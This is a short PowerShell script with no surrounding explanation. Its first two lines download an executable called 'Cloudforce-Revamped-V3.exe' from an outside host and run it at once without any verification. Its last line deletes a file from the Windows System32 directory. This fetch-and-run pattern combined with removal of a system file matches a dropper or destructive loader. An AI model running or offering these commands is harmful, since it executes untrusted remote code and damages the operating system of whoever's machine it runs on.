Invoke-WebRequest -Uri "https://files.zortos.me/Files/Expirimental/Cloudforce-Revamped-V3.exe" -OutFile "C:\Temp\Cloudforce-Revamped-V3.exe"
Start-Process -FilePath "C:\Temp\Cloudforce-Revamped-V3.exe"
Remove-Item -Path "C:\Windows\System32\diskc.sys"
